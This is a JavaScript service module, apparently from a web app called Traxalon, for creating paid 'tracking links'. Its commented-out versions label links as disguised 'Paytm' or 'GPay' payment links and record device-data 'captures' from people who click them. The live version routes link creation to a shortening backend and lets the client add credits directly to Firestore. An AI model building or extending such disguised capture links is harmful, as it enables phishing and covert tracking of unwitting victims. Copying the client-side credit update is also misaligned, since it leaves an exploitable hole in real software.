// import {
//     doc,
//     collection,
//     addDoc,
//     updateDoc,
//     getDoc,
//     increment,
//     serverTimestamp,
//     query,
//     where,
//     getDocs,
// } from "firebase/firestore";
// import { db } from "../firebase/config";

// export function generateToken() {
//     return (
//         Math.random().toString(36).substring(2, 10) +
//         Math.random().toString(36).substring(2, 10)
//     );
// }

// export async function createTrackingLink(uid, label) {
//     const userRef = doc(db, "users", uid);
//     const userSnap = await getDoc(userRef);
//     if (!userSnap.exists()) throw new Error("User not found");

//     const userData = userSnap.data();
//     if (userData.credits < 1) throw new Error("Insufficient credits");

//     const token = generateToken();
//     const trackingUrl = `${window.location.origin}/t/${token}`;

//     await addDoc(collection(db, "trackingLinks"), {
//         uid,
//         token,
//         label: label || "Tracking Link",
//         trackingUrl,
//         disguisedAs: "Paytm Payment Link",
//         clicks: 0,
//         captures: [],
//         createdAt: serverTimestamp(),
//         active: true,
//     });

//     await updateDoc(userRef, {
//         credits: increment(-1),
//         totalLinksGenerated: increment(1),
//     });

//     return { token, trackingUrl };
// }

// export async function recordCapture(token, deviceData) {
//     const linksRef = collection(db, "trackingLinks");
//     const q = query(linksRef, where("token", "==", token));
//     const snap = await getDocs(q);

//     if (snap.empty) return false;

//     const linkDoc = snap.docs[0];
//     const linkRef = doc(db, "trackingLinks", linkDoc.id);

//     await updateDoc(linkRef, {
//         clicks: increment(1),
//         captures: [...(linkDoc.data().captures || []), {
//             ...deviceData,
//             capturedAt: new Date().toISOString(),
//         }],
//     });

//     return true;
// }

// export async function addCredits(uid, amount) {
//     const userRef = doc(db, "users", uid);
//     await updateDoc(userRef, {
//         credits: increment(amount),
//     });
// }





// import {
//     doc,
//     collection,
//     addDoc,
//     updateDoc,
//     getDoc,
//     increment,
//     serverTimestamp,
//     query,
//     where,
//     getDocs,
// } from "firebase/firestore";
// import { db } from "../firebase/config";

// export function generateToken() {
//     return (
//         Math.random().toString(36).substring(2, 10) +
//         Math.random().toString(36).substring(2, 10)
//     );
// }

// export async function createTrackingLink(uid, label) {
//     const userRef = doc(db, "users", uid);
//     const userSnap = await getDoc(userRef);
//     if (!userSnap.exists()) throw new Error("User not found");

//     const userData = userSnap.data();
//     if (userData.credits < 1) throw new Error("Insufficient credits");

//     const token = generateToken();

//     // ✅ Always use the deployed Firebase URL
//     const trackingUrl = `https://traxalon-main-01.vercel.app/t/${token}`;

//     await addDoc(collection(db, "trackingLinks"), {
//         uid,
//         token,
//         label: label || "Tracking Link",
//         trackingUrl,
//         disguisedAs: "GPay Payment Link",
//         clicks: 0,
//         captures: [],
//         createdAt: serverTimestamp(),
//         active: true,
//     });

//     await updateDoc(userRef, {
//         credits: increment(-1),
//         totalLinksGenerated: increment(1),
//     });

//     return { token, trackingUrl };
// }

// export async function recordCapture(token, deviceData) {
//     const linksRef = collection(db, "trackingLinks");
//     const q = query(linksRef, where("token", "==", token));
//     const snap = await getDocs(q);

//     if (snap.empty) return false;

//     const linkDoc = snap.docs[0];
//     const linkRef = doc(db, "trackingLinks", linkDoc.id);

//     await updateDoc(linkRef, {
//         clicks: increment(1),
//         captures: [
//             ...(linkDoc.data().captures || []),
//             {
//                 ...deviceData,
//                 capturedAt: new Date().toISOString(),
//             },
//         ],
//     });

//     return true;
// }

// export async function addCredits(uid, amount) {
//     const userRef = doc(db, "users", uid);
//     await updateDoc(userRef, {
//         credits: increment(amount),
//     });
// }



import {
    doc,
    updateDoc,
    increment,
} from "firebase/firestore";
import { db } from "../firebase/config";

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL || "http://localhost:5001";

// Link creation now goes through backend
export async function createTrackingLink(uid, label, destinationUrl) {
    const res = await fetch(BACKEND_URL + "/api/links/shorten", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ uid, label, destinationUrl }),
    });
    const data = await res.json();
    if (data.error) throw new Error(data.error);
    return { trackingUrl: data.trackingUrl, shortUrl: data.shortUrl, token: data.token };
}

// Credits still handled directly via Firebase on frontend
export async function addCredits(uid, amount) {
    const userRef = doc(db, "users", uid);
    await updateDoc(userRef, {
        credits: increment(amount),
    });
}